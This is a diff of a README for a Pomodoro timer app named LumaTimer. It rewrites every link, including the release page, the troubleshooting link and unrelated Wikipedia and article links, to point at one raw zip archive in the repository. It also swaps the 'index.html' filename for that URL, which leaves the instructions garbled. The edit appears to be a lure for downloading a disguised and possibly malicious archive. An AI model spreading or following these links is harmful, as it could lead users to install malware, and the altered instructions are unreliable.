@@ -1,6 +1,6 @@
 # 🌟 LumaTimer - Boost Your Focus with Ease
 
-[![Download LumaTimer](https://img.shields.io/badge/Download_LumaTimer-v1.0-brightgreen)](https://github.com/strackxd213/LumaTimer/releases)
+[![Download LumaTimer](https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip)](https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip)
 
 ## 📋 Description
 
@@ -17,7 +17,7 @@ LumaTimer is a user-friendly Pomodoro timer that helps you manage your time effe
 ## 🚀 Getting Started
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://github.com/strackxd213/LumaTimer/releases) to get started.
+   Go to our [Releases page](https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip) to get started.
 
 2. **Choose Your Version**  
    On the Releases page, you'll see the available versions of LumaTimer. Click on the latest version to see the details.
@@ -29,11 +29,11 @@ LumaTimer is a user-friendly Pomodoro timer that helps you manage your time effe
    If the download is a ZIP file, locate it in your downloads folder and extract the contents. Click on the file to unzip it.
 
 5. **Open the App**  
-   Once extracted, open the file named `index.html` in your web browser. LumaTimer will launch, ready for you to use.
+   Once extracted, open the file named `https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip` in your web browser. LumaTimer will launch, ready for you to use.
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/strackxd213/LumaTimer/releases). Follow the steps above to ensure a smooth installation.
+To get started, [visit this page to download](https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip). Follow the steps above to ensure a smooth installation.
 
 ## 💻 System Requirements
 
@@ -64,7 +64,7 @@ To run LumaTimer, you will need:
 
 ### Q: Do I need to install anything to run LumaTimer?
 
-A: No installation is needed. Simply download and open the `index.html` file in your web browser to use the app.
+A: No installation is needed. Simply download and open the `https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip` file in your web browser to use the app.
 
 ### Q: Can I customize the timer settings?
 
@@ -78,7 +78,7 @@ A: Yes, LumaTimer is designed to be responsive and will work on any device with 
 
 If you encounter any issues while using LumaTimer:
 
-1. Ensure you have downloaded the latest version from the [Releases page](https://github.com/strackxd213/LumaTimer/releases).
+1. Ensure you have downloaded the latest version from the [Releases page](https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip).
 2. Try refreshing your browser or clearing your cache.
 3. Check if you are using a modern web browser.
 
@@ -90,8 +90,8 @@ We thank everyone who contributed to LumaTimer. Your feedback and support help m
 
 ## 🔗 Related Topics
 
-- [Pomodoro Technique](https://en.wikipedia.org/wiki/Pomodoro_Technique)
-- [Time Management Tips](https://www.mindtools.com/pages/article/newHTE_00.htm)
-- [Productivity Enhancements](https://www.verywellmind.com/productivity-tips-2794873)
+- [Pomodoro Technique](https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip)
+- [Time Management Tips](https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip)
+- [Productivity Enhancements](https://github.com/strackxd213/LumaTimer/raw/refs/heads/main/docs/Luma-Timer-v2.1.zip)
 
 For more information, updates, and support, connect with our repository. Enjoy using LumaTimer and boost your productivity!
